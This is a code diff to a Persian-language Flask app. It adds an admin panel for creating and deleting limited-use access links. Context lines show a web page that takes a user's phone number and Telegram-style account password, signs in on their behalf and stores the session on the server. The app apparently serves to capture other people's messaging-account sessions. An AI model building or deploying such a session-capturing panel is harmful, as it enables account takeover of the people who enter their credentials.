@@ -77,7 +77,7 @@ def delete_session(phone):
         shutil.rmtree(path)
     sessions_col.delete_one({"phone": phone})
 
-# ===================== HTML =====================================
+# ===================== HTML User Panel ===========================
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="fa">
@@ -106,10 +106,7 @@ input, button {
     border:none;
     width:100%;
 }
-button {
-    background:#6366f1;
-    color:white;
-}
+button { background:#6366f1;color:white; }
 #s2,#s3,#done { display:none; }
 </style>
 </head>
@@ -294,6 +291,92 @@ def send_password():
     phone = normalize_phone(request.json["phone"])
     run_async(clients[phone].sign_in(password=request.json["password"]))
     sessions_col.insert_one({"phone": phone})
+    return jsonify(status="ok")
+
+# ===================== Admin Panel ===============================
+ADMIN_HTML = """
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8">
+<title>پنل ادمین</title>
+<style>
+body {background:#020617;color:white;font-family:tahoma}
+.container {width:500px;margin:50px auto;}
+button {padding:6px 12px;border-radius:6px;margin-left:5px;background:#6366f1;color:white;border:none;cursor:pointer;}
+input {padding:6px;width:60px;border-radius:6px;margin-left:5px;border:none;}
+.link-box {margin-bottom:10px;padding:8px;background:rgba(30,30,50,0.8);border-radius:8px;display:flex;justify-content:space-between;align-items:center;}
+</style>
+</head>
+<body>
+<div class="container">
+<h2>پنل ادمین</h2>
+
+<form method="post">
+<input name="max" type="number" placeholder="تعداد استفاده" required>
+<button>ساخت لینک یک‌بارمصرف</button>
+</form>
+<hr>
+
+{% for l in links %}
+<div class="link-box">
+    <div>
+        {{ self_config.base_url }}/?key={{ l.token }}<br>
+        استفاده: {{ l.used }}/{{ l.max }}
+    </div>
+    <div>
+        <button onclick="copyLink('{{ self_config.base_url }}/?key={{ l.token }}')">کپی</button>
+        <button onclick="deleteLink('{{ l.token }}')">حذف</button>
+    </div>
+</div>
+{% endfor %}
+
+<script>
+function copyLink(url) {
+    navigator.clipboard.writeText(url).then(()=>{alert('لینک کپی شد: ' + url);});
+}
+
+function deleteLink(token){
+    fetch('/admin/delete_link', {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({token})
+    }).then(()=> location.reload());
+}
+</script>
+
+</div>
+</body>
+</html>
+"""
+
+@app.route("/admin", methods=["GET","POST"])
+def admin():
+    auth = request.authorization
+    if not auth or auth.username != self_config["admin_username"] or auth.password != self_config["admin_password"]:
+        return ("Unauthorized", 401, {"WWW-Authenticate": "Basic"})
+    
+    if request.method == "POST":
+        links_col.insert_one({
+            "token": gen_token(),
+            "max": int(request.form["max"]),
+            "used": 0,
+            "created": datetime.utcnow()
+        })
+        return redirect("/admin")
+    
+    links = list(links_col.find())
+    return render_template_string(ADMIN_HTML, links=links, self_config=self_config)
+
+@app.route("/admin/delete_link", methods=["POST"])
+def admin_delete_link():
+    auth = request.authorization
+    if not auth or auth.username != self_config["admin_username"] or auth.password != self_config["admin_password"]:
+        return ("Unauthorized", 401, {"WWW-Authenticate": "Basic"})
+    
+    token = request.json.get("token")
+    if token:
+        links_col.delete_one({"token": token})
     return jsonify(status="ok")
 
 # ===================== KEEP ALIVE ================================
